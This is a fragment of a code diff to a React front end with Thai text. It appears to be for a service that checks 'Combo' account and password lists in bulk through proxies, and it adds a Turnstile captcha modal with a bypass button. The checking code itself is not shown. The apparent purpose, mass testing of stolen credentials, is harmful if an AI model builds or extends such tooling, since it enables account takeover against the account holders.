+                       เพื่อใช้เป็นหลักฐานและป้องกันเหตุโจมตีระบบ (DDoS/BotNet)
                      </li>
                      <li>
                        <strong>
@@ -2299,7 +3058,7 @@ function AppContent() {
                      2. การปกป้องข้อมูล Combo และสินทรัพย์ของท่าน
                    </h3>
                    <p className="mb-2">
-                     
+                     สำหรับการใช้เครื่องมือ Checkers ใดๆ ก็ตามบนเว็บไซต์
                      ทางแพลตฟอร์มขอยืนยันว่า{" "}
                      <strong>
                        จะไม่มีการบันทึกหรือโจรกรรมข้อมูลบัญชี/รหัสผ่านหน้าเว็บแบบเต็มจำนวนเพื่อผลประโยชน์อื่นใด
@@ -2531,7 +3290,7 @@ function AppContent() {
                      <li>
                        <strong>ระบบตรวจสอบไอดี (ตัวเช็ค):</strong>
                        ทรงพลังที่รองรับบัญชีจำนวนมากพร้อมกัน
-                       โดยไม่สูญเสียความแม่นยำ
+                       โดยไม่สูญเสียความแม่นยำ พร้อมเทคโนโลยีคัดกรอง Proxy
                        ที่ทันสมัย
                      </li>
                      <li>
@@ -2559,7 +3318,7 @@ function AppContent() {
                      สถาปัตยกรรมเซิร์ฟเวอร์ของเรามีระบบการแฮชคีย์รหัสผ่าน
                      การลดพึ่งพิงฐานข้อมูลที่เก็บรอยนิ้วมือของผู้ใช้ (Zero
                      Logging Policy สำหรับเครดิตการเช็ค)
-                     
+                     และขับเคลื่อนเซิร์ฟเวอร์ด้วย Proxy ป้องกันการรุกล้ำ
                      ทำให้ข้อมูลการทำธุรกรรมของคุณได้รับการการันตี 100%
                      ภายใต้ความน่าเชื่อถือของแพลตฟอร์ม
                    </p>
@@ -2690,6 +3449,54 @@ function AppContent() {
          />
        </Suspense>
 
+       {/* Turnstile Modal */}
+       {showTurnstileModal && (
+         <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center p-4 z-[70] font-sans animate-in zoom-in-95 duration-200">
+           <div className="bg-[#09090b] border border-[#1e1e1e] border p-6 sm:p-8 max-w-sm w-full relative overflow-hidden flex flex-col items-center">
+             <div className="bg-[#09090b] border border-[#1e1e1e] border mb-2 relative overflow-hidden w-full h-[58px]">
+               <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[110%] scale-[0.92] flex justify-center">
+                 {TURNSTILE_SITE_KEY ? (
+                   <Turnstile
+                     siteKey={TURNSTILE_SITE_KEY}
+                     options={{ theme: "dark", size: "flexible" }}
+                     onSuccess={(token) => {
+                       setPendingTurnstileToken(token);
+                       setShowTurnstileModal(false);
+                       executeCheck(token, savedLinesToCheck).catch(
+                         console.error,
+                       );
+                     }}
+                   />
+                 ) : (
+                   <div className="p-3 bg-primary text-primary-foreground text-[#10b981] text-center text-[10px] font-medium w-full mx-8">
+                     ยังไม่ได้ตั้งค่า TURNSTILE_SITE_KEY (Bypass Mode
+                     Active)
+                   </div>
+                 )}
+               </div>
+             </div>
+             {!TURNSTILE_SITE_KEY && (
+               <button
+                 onClick={() => {
+                   setShowTurnstileModal(false);
+                   executeCheck("bypass", savedLinesToCheck).catch(
+                     console.error,
+                   );
+                 }}
+                 className="w-full bg-primary text-primary-foreground hover:bg-[#10b981] text-white font-medium py-3.5 transition-all mb-4"
+               >
+                 ดำเนินการต่อ (Bypass)
+               </button>
+             )}
+             <button
+               onClick={() => setShowTurnstileModal(false)}
+               className="text-[10px] font-medium text-muted-foreground hover:text-zinc-400 transition-colors uppercase tracking-widest mt-2"
+             >
+               Cancel
+             </button>
+           </div>
+         </div>
+       )}
 
        {/* Modals */}
        <Suspense fallback={null}>
